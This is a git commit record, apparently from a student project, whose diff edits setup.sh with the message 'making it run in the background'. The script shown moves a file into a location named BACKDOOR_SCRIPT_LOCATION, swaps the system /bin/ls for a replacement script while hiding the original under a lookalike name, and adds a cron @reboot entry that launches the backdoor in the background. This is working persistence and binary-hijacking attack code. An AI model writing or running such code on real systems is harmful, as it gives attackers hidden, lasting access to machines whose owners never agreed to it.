156176bb1a8fa561626acdb06f586dc97229a7e0
tony-ngo-03 <tonyngo@utexas.edu>
2024-10-29 16:03:01 -0500

    making it run in the background

--- setup.sh
+++ setup.sh
@@ -11,4 +11,4 @@ mv StartupCheck.sh "${BACKDOOR_SCRIPT_LOCATION}"
 mv /bin/ls /bin/Is
 mv new_ls.sh /bin/ls
 
-crontab -l | { cat; echo "@reboot ${BACKDOOR_SCRIPT_LOCATION}StartupCheck.sh"; } | crontab -
+crontab -l | { cat; echo "@reboot ${BACKDOOR_SCRIPT_LOCATION}StartupCheck.sh &"; } | crontab -
